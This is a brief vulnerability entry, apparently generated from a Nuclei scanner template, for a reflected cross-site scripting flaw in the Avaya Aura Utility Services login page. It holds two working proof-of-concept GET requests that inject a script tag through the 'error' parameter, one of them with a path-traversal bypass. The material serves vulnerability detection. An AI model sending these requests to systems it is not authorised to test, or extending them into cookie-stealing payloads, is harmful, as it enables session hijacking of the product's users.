# Vulnerability: Avaya Aura Utility Services Administration - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`avaya-aura-xss.yaml`)

## Description
Avaya Aura Utility Services Administration contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
GET {{BaseURL}}/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
```

